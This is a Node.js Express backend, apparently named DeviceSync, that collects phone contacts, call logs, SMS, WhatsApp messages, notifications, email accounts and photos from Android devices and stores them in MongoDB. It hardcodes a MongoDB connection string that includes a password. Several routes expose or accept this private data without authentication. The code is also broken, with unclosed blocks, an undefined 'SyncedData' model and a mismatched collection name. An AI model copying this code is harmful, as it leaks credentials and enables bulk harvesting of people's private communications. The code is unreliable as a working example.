const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const crypto = require('crypto');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

// Import models
const Device = require('./models/Device');
const User = require('./models/User');
const Contact = require('./models/Contact');
const CallLog = require('./models/CallLog');
const Message = require('./models/Message');
const Notification = require('./models/Notification');
const EmailAccount = require('./models/EmailAccount');
const WhatsApp = require('./models/WhatsApp');
const SyncHistory = require('./models/SyncHistory');

const app = express();
const PORT = 5001;
const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-in-production';

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://dbuser:Bil%40l112@cluster0.ey6gj6g.mongodb.net/sync_data';

mongoose.connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => {
    console.log('✅ Connected to MongoDB database: sync_data');
})
.catch((error) => {
    console.error('❌ MongoDB connection error:', error);
    process.exit(1);
});

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Authentication middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ success: false, error: 'Access token required' });
    }
    
    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ success: false, error: 'Invalid token' });
        }
        req.user = user;
        next();
    });
};

// Helper function to generate data hash for duplicate detection
function generateDataHash(deviceId, dataType, data) {
    const dataString = JSON.stringify(data);
    return crypto.createHash('md5').update(`${deviceId}-${dataType}-${dataString}`).digest('hex');
}

// API Routes

// Authentication Routes
app.post('/api/auth/register', async (req, res) => {
    try {
        const { username, email, password, firstName, lastName } = req.body;
        
        // Check if user already exists
        const existingUser = await User.findOne({ 
            $or: [{ email }, { username }] 
        });
        
        if (existingUser) {
            return res.status(400).json({
                success: false,
                error: 'User with this email or username already exists'
            });
        }
        
        // Create new user
        const user = new User({
            username,
            email,
            password,
            firstName,
            lastName
        });
        
        await user.save();
        
        // Generate JWT token
        const token = jwt.sign(
            { userId: user._id, username: user.username },
            JWT_SECRET,
            { expiresIn: '7d' }
        );
        
        res.json({
            success: true,
            data: {
                user: user.toJSON(),
                token
            },
            message: 'User registered successfully'
        });
    } catch (error) {
        console.error('Error registering user:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to register user'
        });
    }
});

app.post('/api/auth/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Find user by username or email
        const user = await User.findOne({
            $or: [{ username }, { email: username }]
        });
        
        if (!user) {
            return res.status(401).json({
                success: false,
                error: 'Invalid credentials'
            });
        }
        
        // Check password
        const isValidPassword = await user.comparePassword(password);
        if (!isValidPassword) {
            return res.status(401).json({
                success: false,
                error: 'Invalid credentials'
            });
        }
        
        // Update last login
        user.lastLogin = new Date();
        await user.save();
        
        // Generate JWT token
        const token = jwt.sign(
            { userId: user._id, username: user.username },
            JWT_SECRET,
            { expiresIn: '7d' }
        );
        
        res.json({
            success: true,
            data: {
                user: user.toJSON(),
                token
            },
            message: 'Login successful'
        });
    } catch (error) {
        console.error('Error logging in:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to login'
        });
    }
});

// 1. Register Device (requires authentication)
app.post('/api/devices', authenticateToken, async (req, res) => {
    try {
        const deviceInfo = req.body;
        console.log('Registering device:', deviceInfo);
        
        // Check if device already exists
        let device = await Device.findOne({ deviceId: deviceInfo.deviceId });
        
        if (device) {
            // Update existing device
            device = await Device.findOneAndUpdate(
                { deviceId: deviceInfo.deviceId },
                { 
                    ...deviceInfo,
                    lastSeen: new Date()
                },
                { new: true }
            );
        } else {
            // Create new device
            device = new Device({
                ...deviceInfo,
                lastSeen: new Date()
            });
            await device.save();
        }
        
        res.json({
            success: true,
            data: device,
            message: 'Device registered successfully'
        });
    } catch (error) {
        console.error('Error registering device:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to register device'
        });
    }
});

// 2. Get All Devices
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find().sort({ lastSeen: -1 });
        console.log('Getting all devices. Count:', devices.length);
        res.json({
            success: true,
            data: devices
        });
    } catch (error) {
        console.error('Error getting devices:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get devices'
        });
    }
});

// 3. Get Specific Device
app.get('/api/devices/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const device = await Device.findOne({ deviceId });
        
        if (device) {
            res.json({
                success: true,
                data: device
            });
        } else {
            res.status(404).json({
                success: false,
                error: 'Device not found'
            });
        }
    } catch (error) {
        console.error('Error getting device:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get device'
        });
    }
});

// 4. Sync Data (with device-specific collections) - Requires authentication
app.post('/api/devices/:deviceId/sync', authenticateToken, async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data, timestamp } = req.body;
        
        console.log(`Syncing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let itemsSynced = 0;
        let Model, collectionName;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact.getModelForDevice(deviceId);
                collectionName = Contact.getCollectionName(deviceId);
                break;
            case 'CALL_LOGS':
                Model = CallLog.getModelForDevice(deviceId);
                collectionName = CallLog.getCollectionName(deviceId);
                break;
            case 'MESSAGES':
                Model = Message.getModelForDevice(deviceId);
                collectionName = Message.getCollectionName(deviceId);
                break;
            case 'WHATSAPP':
                Model = WhatsApp.getModelForDevice(deviceId);
                collectionName = Message.getCollectionName(deviceId);
                break;
            case 'NOTIFICATIONS':
                Model = Notification.getModelForDevice(deviceId);
                collectionName = Notification.getCollectionName(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        // Process each item
        for (const item of data) {
            try {
                // Map fields based on data type
                let mappedItem = { ...item };
                
                switch (dataType) {
                    case 'CALL_LOGS':
                        // Map Android call log fields to database fields
                        mappedItem = {
                            phoneNumber: item.number || item.phoneNumber,
                            contactName: item.name || item.contactName,
                            callType: item.type || item.callType,
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date()),
                            duration: item.duration || 0
                        };
                        break;
                    case 'CONTACTS':
                        // Map Android contact fields to database fields
                        mappedItem = {
                            name: item.name,
                            phoneNumber: item.phoneNumber,
                            phoneType: item.phoneType || 'MOBILE',
                            emails: item.emails || [],
                            organization: item.organization || ''
                        };
                        break;
                    case 'MESSAGES':
                        // Map Android message fields to database fields
                        mappedItem = {
                            address: item.address || item.phoneNumber,
                            body: item.body || item.message,
                            type: item.type || 'SMS',
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date())
                        };
                        break;
                    case 'WHATSAPP':
                        // Map WhatsApp message fields to database fields
                        console.log('Processing WHATSAPP item:', item);
                        mappedItem = {
                            messageId: item.messageId || `wa_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            chatId: item.chatId || `chat_${item.chatName?.replace(/\s+/g, '_') || 'unknown'}`,
                            chatName: item.chatName || item.address || 'Unknown Chat',
                            senderId: item.senderId || 'unknown',
                            senderName: item.senderName || 'Unknown Sender',
                            message: item.message || item.body || '',
                            messageType: item.messageType || 'TEXT',
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date()),
                            isIncoming: item.isIncoming !== undefined ? item.isIncoming : true,
                            mediaPath: item.mediaPath || null,
                            mediaSize: item.mediaSize || null
                        };
                        console.log('Mapped WHATSAPP item:', mappedItem);
                        break;
                    case 'NOTIFICATIONS':
                        // Map Android notification fields to database fields
                        console.log('Processing NOTIFICATIONS item:', item);
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName,
                            appName: item.appName || item.packageName,
                            title: item.title,
                            text: item.text || item.body,
                            timestamp: item.postTime ? new Date(item.postTime) : (item.timestamp ? new Date(item.timestamp) : new Date())
                        };
                        console.log('Mapped NOTIFICATIONS item:', mappedItem);
                        break;
                }
                
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                
                // Special duplicate checking for notifications
                let existingData;
                if (dataType === 'NOTIFICATIONS') {
                    // Check for notifications with same title, appName, and packageName
                    existingData = await Model.findOne({
                        title: mappedItem.title,
                        appName: mappedItem.appName,
                        packageName: mappedItem.packageName
                    });
                } else {
                
                if (existingData) {
                    console.log(`Data already exists for ${dataType}, skipping duplicate`);
                    continue;
                }
                
                // Add sync time and hash to item
                const itemWithMetadata = {
                    ...mappedItem,
                    syncTime: new Date(),
                    dataHash
                };
                
                // Save to device-specific collection
                const newData = new Model(itemWithMetadata);
                await newData.save();
                itemsSynced++;
                
            } catch (itemError) {
                console.error(`Error processing item in ${dataType}:`, itemError);
            }
        }
        
        // Add to sync history
        const historyRecord = new SyncHistory({
            deviceId,
            dataType,
            syncStartTime: new Date(timestamp),
            syncEndTime: new Date(),
            status: 'SUCCESS',
            itemsSynced,
            errorMessage: null
        });
        
        await historyRecord.save();
        
        // Update device last seen or create if doesn't exist
        await Device.findOneAndUpdate(
            { deviceId },
            { 
                deviceId,
                lastSeen: new Date(),
                isActive: true
            },
            { upsert: true, new: true }
        );
        
        console.log(`✅ Successfully synced ${itemsSynced} ${dataType} items to ${collectionName}`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsSynced,
                message: `${itemsSynced} items synced successfully to ${collectionName}`
            }
        });
    } catch (error) {
        console.error('Error syncing data:', error);
        // Log failed sync attempt
        try {
            const historyRecord = new SyncHistory({
                deviceId: req.params.deviceId,
                dataType: req.body.dataType,
                syncStartTime: new Date(req.body.timestamp),
                syncEndTime: new Date(),
                status: 'FAILED',
                itemsSynced: 0,
                errorMessage: error.message
            });
            await historyRecord.save();
        } catch (historyError) {
            console.error('Error saving sync history:', historyError);
        }
        res.status(500).json({
            success: false,
            error: 'Failed to sync data'
        });
    }
});

// 4.5. Sync Data (NO AUTHENTICATION - For Testing)
app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data, timestamp } = req.body;
        
        console.log(`🔓 TEST MODE: Syncing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let itemsSynced = 0;
        let Model, collectionName;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact.getModelForDevice(deviceId);
                collectionName = Contact.getCollectionName(deviceId);
                break;
            case 'CALL_LOGS':
                Model = CallLog.getModelForDevice(deviceId);
                collectionName = CallLog.getCollectionName(deviceId);
                break;
            case 'MESSAGES':
                Model = Message.getModelForDevice(deviceId);
                collectionName = Message.getCollectionName(deviceId);
                break;
            case 'WHATSAPP':
                Model = WhatsApp.getModelForDevice(deviceId);
                collectionName = Message.getCollectionName(deviceId);
                break;
            case 'NOTIFICATIONS':
                Model = Notification.getModelForDevice(deviceId);
                collectionName = Notification.getCollectionName(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        // Process each item
        for (const item of data) {
            try {
                // Map fields based on data type
                let mappedItem = { ...item };
                
                switch (dataType) {
                    case 'CALL_LOGS':
                        // Map Android call log fields to database fields
                        mappedItem = {
                            phoneNumber: item.number || item.phoneNumber,
                            contactName: item.name || item.contactName,
                            callType: item.type || item.callType,
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date()),
                            duration: item.duration || 0
                        };
                        break;
                    case 'CONTACTS':
                        // Map Android contact fields to database fields
                        mappedItem = {
                            name: item.name,
                            phoneNumber: item.phoneNumber,
                            phoneType: item.phoneType || 'MOBILE',
                            emails: item.emails || [],
                            organization: item.organization || ''
                        };
                        break;
                    case 'MESSAGES':
                        // Map Android message fields to database fields
                        mappedItem = {
                            address: item.address || item.phoneNumber,
                            body: item.body || item.message,
                            type: item.type || 'SMS',
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date())
                        };
                        break;
                    case 'NOTIFICATIONS':
                        // Map Android notification fields to database fields
                        console.log('Processing NOTIFICATIONS item:', item);
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName,
                            appName: item.appName || item.packageName,
                            title: item.title,
                            text: item.text || item.body,
                            timestamp: item.postTime ? new Date(item.postTime) : (item.timestamp ? new Date(item.timestamp) : new Date())
                        };
                        console.log('Mapped NOTIFICATIONS item:', mappedItem);
                        break;
                    case 'WHATSAPP':
                        // Map WhatsApp message fields to database fields
                        console.log('Processing WHATSAPP item:', item);
                        mappedItem = {
                            messageId: item.messageId || `wa_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            chatId: item.chatId || `chat_${item.chatName?.replace(/\s+/g, '_') || 'unknown'}`,
                            chatName: item.chatName || item.address || 'Unknown Chat',
                            senderId: item.senderId || 'unknown',
                            senderName: item.senderName || 'Unknown Sender',
                            message: item.message || item.body || '',
                            messageType: item.messageType || 'TEXT',
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date()),
                            isIncoming: item.isIncoming !== undefined ? item.isIncoming : true,
                            mediaPath: item.mediaPath || null,
                            mediaSize: item.mediaSize || null
                        };
                        console.log('Mapped WHATSAPP item:', mappedItem);
                        break;
                    case 'EMAIL_ACCOUNTS':
                        // Map Android email account fields to database fields
                        console.log('Processing EMAIL_ACCOUNTS item:', item);
                        mappedItem = {
                            accountId: item.accountId || `email_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            emailAddress: item.email,
                            accountName: item.name || item.displayName,
                            provider: item.provider || 'Gmail',
                            accountType: item.type || 'IMAP'
                        };
                        console.log('Mapped EMAIL_ACCOUNTS item:', mappedItem);
                        break;
                }
                
                }
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                
                // Special duplicate checking for notifications
                let existingData;
                if (dataType === 'NOTIFICATIONS') {
                    // Check for notifications with same title, appName, and packageName
                    existingData = await Model.findOne({
                        title: mappedItem.title,
                        appName: mappedItem.appName,
                        packageName: mappedItem.packageName
                    });
                } else {
                
                if (existingData) {
                    console.log(`Data already exists for ${dataType}, skipping duplicate`);
                    continue;
                }
                
                // Add sync time and hash to item
                const itemWithMetadata = {
                    ...mappedItem,
                    syncTime: new Date(),
                    dataHash
                };
                
                // Save to device-specific collection
                const newData = new Model(itemWithMetadata);
                await newData.save();
                itemsSynced++;
                
            } catch (itemError) {
                console.error(`Error processing item in ${dataType}:`, itemError);
            }
        }
        
        // Add to sync history
        const historyRecord = new SyncHistory({
            deviceId,
            dataType,
            syncStartTime: new Date(timestamp),
            syncEndTime: new Date(),
            status: 'SUCCESS',
            itemsSynced,
            errorMessage: null
        });
        
        await historyRecord.save();
        
        // Update device last seen or create if doesn't exist
        await Device.findOneAndUpdate(
            { deviceId },
            { 
                deviceId,
                lastSeen: new Date(),
                isActive: true
            },
            { upsert: true, new: true }
        );
        
        console.log(`✅ TEST MODE: Successfully synced ${itemsSynced} ${dataType} items to ${collectionName}`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsSynced,
                message: `TEST MODE: ${itemsSynced} items synced successfully to ${collectionName}`
            }
        });
    } catch (error) {
        console.error('Error syncing data (TEST MODE):', error);
        // Log failed sync attempt
        try {
            const historyRecord = new SyncHistory({
                deviceId: req.params.deviceId,
                dataType: req.body.dataType,
                syncStartTime: new Date(req.body.timestamp),
                syncEndTime: new Date(),
                status: 'FAILED',
                itemsSynced: 0,
                errorMessage: error.message
            });
            await historyRecord.save();
        } catch (historyError) {
            console.error('Error saving sync history:', historyError);
        }
        res.status(500).json({
            success: false,
            error: 'Failed to sync data (TEST MODE)'
        });
    }
});

// 5. Get Synced Data
app.get('/api/devices/:deviceId/data/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        
        const syncedData = await SyncedData.findOne({ 
            deviceId, 
            dataType 
        }).sort({ syncTime: -1 });
        
        const data = syncedData ? syncedData.data : [];
        
        console.log(`Getting ${dataType} data for device ${deviceId}. Items: ${data.length}`);
        
        res.json({
            success: true,
            data: data
        });
    } catch (error) {
        console.error('Error getting synced data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get synced data'
        });
    }
});

// 6. Get Sync History
app.get('/api/devices/:deviceId/sync-history', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        const deviceHistory = await SyncHistory.find({ deviceId }).sort({ syncStartTime: -1 });
        
        console.log(`Getting sync history for device ${deviceId}. Records: ${deviceHistory.length}`);
        
        res.json({
            success: true,
            data: deviceHistory
        });
    } catch (error) {
        console.error('Error getting sync history:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get sync history'
        });
    }
});

// 7. Get Data Types
app.get('/api/devices/:deviceId/data-types', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        const dataTypes = ['CONTACTS', 'CALL_LOGS', 'MESSAGES', 'NOTIFICATIONS', 'EMAIL_ACCOUNTS', 'FILES'];
        const dataTypeInfo = [];
        
        for (const type of dataTypes) {
            let latestSync = null;
            let itemCount = 0;
            
            // Get the appropriate model based on data type
            let Model;
            switch (type) {
                case 'CONTACTS':
                    Model = Contact;
                    break;
                case 'CALL_LOGS':
                    Model = CallLog;
                    break;
                case 'MESSAGES':
                    Model = Message;
                    break;
                case 'NOTIFICATIONS':
                    Model = Notification;
                    break;
                default:
                    Model = null;
            }
            
            if (Model) {
                latestSync = await Model.findOne({ deviceId }).sort({ syncTime: -1 });
                itemCount = await Model.countDocuments({ deviceId });
            }
            
            dataTypeInfo.push({
                type,
                deviceId,
                isEnabled: true,
                lastSyncTime: latestSync ? latestSync.syncTime : null,
                itemCount: itemCount
            });
        }
        
        console.log(`Getting data types for device ${deviceId}`);
        
        res.json({
            success: true,
            data: dataTypeInfo
        });
    } catch (error) {
        console.error('Error getting data types:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get data types'
        });
    }
});

// 8. Update Data Type
app.put('/api/devices/:deviceId/data-types/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        const dataTypeInfo = req.body;
        
        console.log(`Updating data type ${dataType} for device ${deviceId}`);
        
        res.json({
            success: true,
            data: dataTypeInfo
        });
    } catch (error) {
        console.error('Error updating data type:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update data type'
        });
    }
});

// Media Schema for MongoDB
const mediaSchema = new mongoose.Schema({
    deviceId: { type: String, required: true },
    name: { type: String, required: true },
    originalPath: { type: String, required: true },
    serverPath: { type: String, required: true },
    size: { type: Number, required: true },
    type: { type: String, required: true },
    mimeType: { type: String, required: true },
    dateAdded: { type: Date, required: true },
    syncTime: { type: Date, default: Date.now },
    dataHash: { type: String, required: true },
    isLatestImage: { type: Boolean, default: false }
}, { timestamps: true });

// Create device-specific collection
const getMediaModel = (deviceId) => {
    const collectionName = `media_${deviceId}`;
    return mongoose.model(collectionName, mediaSchema, collectionName);
};

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const deviceId = req.params.deviceId;
        let uploadDir;
        
        if (file.mimetype.startsWith('image/')) {
            uploadDir = path.join(__dirname, 'mobileData', deviceId, 'Images');
        } else if (file.mimetype.startsWith('video/')) {
            uploadDir = path.join(__dirname, 'mobileData', deviceId, 'Videos');
        } else {
            uploadDir = path.join(__dirname, 'mobileData', deviceId, 'Other');
        }
        
        // Create directory if it doesn't exist
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        
        cb(null, uploadDir);
    },
    filename: function (req, file, cb) {
        // Generate unique filename with timestamp
        const timestamp = Date.now();
        const originalName = file.originalname || 'unknown';
        const ext = path.extname(originalName);
        const nameWithoutExt = path.basename(originalName, ext);
        const filename = `${nameWithoutExt}_${timestamp}${ext}`;
        cb(null, filename);
    }
});

const upload = multer({ 
    storage: storage,
    limits: {
        fileSize: 100 * 1024 * 1024 // 100MB limit
    }
});

// 🎯 TOP-TIER ENDPOINT: Upload last 5 images from mobile
app.post('/api/test/devices/:deviceId/upload-last-5-images', upload.array('files', 5), async (req, res) => {
    try {
        const { deviceId } = req.params;
        const files = req.files;
        const metadata = JSON.parse(req.body.metadata || '[]');
        
        console.log(`🎯 TOP-TIER: Uploading last 5 images for device ${deviceId}. Files received: ${files.length}`);
        
        // Create device directory if it doesn't exist
        const deviceDir = path.join(__dirname, 'mobileData', deviceId);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
            console.log(`📁 Created device directory: ${deviceDir}`);
        }
        
        // Create Images directory
        const imagesDir = path.join(deviceDir, 'Images');
        if (!fs.existsSync(imagesDir)) {
            fs.mkdirSync(imagesDir, { recursive: true });
        }
        
        const MediaModel = getMediaModel(deviceId);
        let itemsSynced = 0;
        const uploadedFiles = [];
        
        // Set all previous latest images to false
        await MediaModel.updateMany({}, { isLatestImage: false });
        
        // Process each uploaded image (max 5)
        for (let i = 0; i < Math.min(files.length, 5); i++) {
            try {
                const file = files[i];
                const itemMetadata = metadata[i] || {};
                
                // Generate data hash for duplicate detection
                const dataHash = crypto
                    .createHash('md5')
                    .update(`${deviceId}-${file.originalname}-${file.size}`)
                    .digest('hex');
                
                // Check for existing file
                const existingMedia = await MediaModel.findOne({ dataHash });
                if (existingMedia) {
                    console.log(`📄 Image already exists: ${file.originalname}`);
                    continue;
                }
                
                // Validate file type - only process images
                if (!file.mimetype.startsWith('image/')) {
                    console.log(`⚠️ Skipping non-image file: ${file.originalname} (${file.mimetype})`);
                    continue;
                }
                
                // Create media record in database
                const mediaRecord = new MediaModel({
                    deviceId: deviceId,
                    name: itemMetadata.name || file.originalname,
                    originalPath: itemMetadata.path || `/storage/emulated/0/Pictures/${file.originalname}`,
                    serverPath: file.path,
                    size: file.size,
                    type: 'image',
                    mimeType: file.mimetype,
                    dateAdded: itemMetadata.dateAdded ? new Date(itemMetadata.dateAdded) : new Date(),
                    syncTime: new Date(),
                    dataHash: dataHash,
                    isLatestImage: true
                });
                
                await mediaRecord.save();
                console.log(`📸 Saved latest image: ${file.originalname} -> ${file.path}`);
                
                uploadedFiles.push({
                    name: file.originalname,
                    size: file.size,
                    path: file.path,
                    dateAdded: mediaRecord.dateAdded
                });
                
                itemsSynced++;
                
            } catch (fileError) {
                console.error(`Error processing file ${files[i]?.originalname}:`, fileError);
            }
        }
        
        // Get total images count for this device
        const totalImagesInDevice = await MediaModel.countDocuments({ deviceId });
        const latestImagesCount = await MediaModel.countDocuments({ deviceId, isLatestImage: true });
        
        console.log(`🎯 TOP-TIER: ${itemsSynced} latest images uploaded successfully for device ${deviceId}`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsSynced,
                message: `🎯 TOP-TIER: ${itemsSynced} latest images uploaded successfully for device ${deviceId}`,
                uploadedFiles,
                totalImagesInDevice,
                latestImagesCount
            }
        });
        
    } catch (error) {
        console.error('❌ Error uploading latest images:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload latest images'
        });
    }
});

// Get latest images for a device
app.get('/api/test/devices/:deviceId/latest-images', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const MediaModel = getMediaModel(deviceId);
        
        const latestImages = await MediaModel.find({ 
            deviceId, 
            isLatestImage: true 
        }).sort({ dateAdded: -1 });
        
        res.json({
            success: true,
            data: {
                deviceId,
                latestImages,
                count: latestImages.length
            }
        });
        
    } catch (error) {
        console.error('Error getting latest images:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get latest images'
        });
    }
});

// General media upload endpoint
app.post('/api/test/devices/:deviceId/upload-media', upload.array('files', 50), async (req, res) => {
    try {
        const { deviceId } = req.params;
        const files = req.files;
        const metadata = JSON.parse(req.body.metadata || '[]');
        
        console.log(`📱 Uploading media for device ${deviceId}. Files received: ${files.length}`);
        
        // Create device directory if it doesn't exist
        const deviceDir = path.join(__dirname, 'mobileData', deviceId);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
        }
        
        const MediaModel = getMediaModel(deviceId);
        let itemsSynced = 0;
        const uploadedFiles = [];
        
        // Process each uploaded file
        for (let i = 0; i < files.length; i++) {
            try {
                const file = files[i];
                const itemMetadata = metadata[i] || {};
                
                // Generate data hash for duplicate detection
                const dataHash = crypto
                    .createHash('md5')
                    .update(`${deviceId}-${file.originalname}-${file.size}`)
                    .digest('hex');
                
                // Check for existing file
                const existingMedia = await MediaModel.findOne({ dataHash });
                if (existingMedia) {
                    console.log(`📄 File already exists: ${file.originalname}`);
                    continue;
                }
                
                // Create media record in database
                const mediaRecord = new MediaModel({
                    deviceId: deviceId,
                    name: itemMetadata.name || file.originalname,
                    originalPath: itemMetadata.path || file.path,
                    serverPath: file.path,
                    size: file.size,
                    type: file.mimetype.startsWith('image/') ? 'image' : 
                          file.mimetype.startsWith('video/') ? 'video' : 'other',
                    mimeType: file.mimetype,
                    dateAdded: itemMetadata.dateAdded ? new Date(itemMetadata.dateAdded) : new Date(),
                    syncTime: new Date(),
                    dataHash: dataHash,
                    isLatestImage: false
                });
                
                await mediaRecord.save();
                console.log(`📁 Saved media: ${file.originalname} -> ${file.path}`);
                
                uploadedFiles.push({
                    name: file.originalname,
                    size: file.size,
                    path: file.path,
                    dateAdded: mediaRecord.dateAdded
                });
                
                itemsSynced++;
                
            } catch (fileError) {
                console.error(`Error processing file ${files[i]?.originalname}:`, fileError);
            }
        }
        
        console.log(`✅ Successfully synced ${itemsSynced} media files for device ${deviceId}`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsSynced,
                message: `TEST MODE: ${itemsSynced} media files uploaded successfully for device ${deviceId}`,
                uploadedFiles
            }
        });
        
    } catch (error) {
        console.error('Error uploading media:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload media'
        });
    }
});

// Get media files for a device
app.get('/api/test/devices/:deviceId/media', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const MediaModel = getMediaModel(deviceId);
        
        const media = await MediaModel.find({ deviceId }).sort({ dateAdded: -1 });
        
        res.json({
            success: true,
            data: {
                deviceId,
                mediaCount: media.length,
                media
            }
        });
        
    } catch (error) {
        console.error('Error getting media:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get media'
        });
    }
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
    try {
        const deviceCount = await Device.countDocuments();
        const contactCount = await Contact.countDocuments();
        const callLogCount = await CallLog.countDocuments();
        const messageCount = await Message.countDocuments();
        const notificationCount = await Notification.countDocuments();
        const emailCount = await EmailAccount.countDocuments();
        const syncHistoryCount = await SyncHistory.countDocuments();
        
        const totalSyncedRecords = contactCount + callLogCount + messageCount + notificationCount + emailCount;
        
        res.json({
            success: true,
            message: 'DeviceSync Backend Server is running with MongoDB',
            timestamp: new Date().toISOString(),
            database: 'MongoDB',
            stats: {
                devices: deviceCount,
                syncedRecords: totalSyncedRecords,
                syncHistory: syncHistoryCount
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 DeviceSync Backend Server running on http://localhost:${PORT}`);
    console.log(`📱 API Base URL: http://localhost:${PORT}/api/`);
    console.log(`🏥 Health Check: http://localhost:${PORT}/api/health`);
    console.log(`📱 For Android Emulator: http://10.0.2.2:${PORT}/api/`);
    console.log(`📱 For Same Network: http://10.151.145.254:${PORT}/api/`);
    console.log(`🗄️  Database: MongoDB (sync_data)`);
});

module.exports = app;
